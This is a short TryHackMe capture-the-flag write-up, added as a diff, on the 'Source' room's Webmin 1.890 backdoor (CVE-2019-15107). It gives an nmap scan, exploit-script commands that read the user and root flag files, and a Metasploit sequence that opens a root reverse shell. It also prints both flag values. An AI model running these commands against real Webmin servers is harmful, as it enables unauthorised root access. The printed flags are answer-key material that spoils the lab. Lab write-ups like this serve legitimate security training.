@@ -1,0 +1,64 @@
+# TryHackMe - Source Writeup
+
+Easy CTF Room
+
+## Info
+
+Platform: TryHackMe
+Room: Source
+Difficulty: Easy
+Vulnerability: CVE-2019-15107
+
+## Enumeration
+
+Open ports:
+- 22 (SSH)
+- 10000 (Webmin 1.890)
+
+Nmap scan:
+
+    nmap -sC -sV <TARGET_IP>
+
+ Exploitation
+
+Webmin 1.890 has a backdoor (CVE-2019-15107) that allows RCE as root.
+
+ Way 1 - Python Exploit
+
+Get user flag:
+
+    python3 exploit.py -i <TARGET_IP> -p 10000 -c "cat /home/dark/user.txt"
+
+Get root flag:
+
+    python3 exploit.py -i <TARGET_IP> -p 10000 -c "cat /root/root.txt"
+
+ Way 2 - Metasploit
+
+    msfconsole -q
+    use exploit/linux/http/webmin_backdoor
+    set RHOSTS <TARGET_IP>
+    set RPORT 10000
+    set LHOST <YOUR_IP>
+    set LPORT 4444
+    set SSL true
+    run
+
+This gives a root shell.
+
+## Flags
+
+User: THM{SUPPLY_CHAIN_COMPROMISE}
+
+Root: THM{UPDATE_YOUR_INSTALL}
+
+## What I Learned
+
+- Always update software
+- Webmin 1.890 had a supply chain backdoor
+- Check for known CVEs
+
+ Links
+
+- https://nvd.nist.gov/vuln/detail/CVE-2019-15107
+- https://www.exploit-db.com/exploits/47230
